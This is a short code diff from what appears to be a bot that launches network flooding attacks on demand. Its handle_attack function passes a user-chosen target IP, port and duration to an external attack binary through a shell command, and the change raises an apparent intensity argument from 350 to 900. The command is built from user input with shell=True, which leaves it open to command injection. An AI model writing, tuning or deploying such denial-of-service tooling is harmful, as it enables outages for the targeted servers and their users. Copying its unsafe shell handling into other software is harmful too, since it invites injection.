@@ -182,7 +182,7 @@ def handle_attack(message):
     def run_attack():
         global active_attacks, pending_feedback
         try:
-            full_command = f"{nxtlvl_PATH} {target} {port} {time_duration} 350"
+            full_command = f"{nxtlvl_PATH} {target} {port} {time_duration} 900"
             subprocess.run(full_command, shell=True, capture_output=True, text=True)
         finally:
             active_attacks = [a for a in active_attacks if not (a['user'] == user_id and a['ip'] == target and a['port'] == port)]
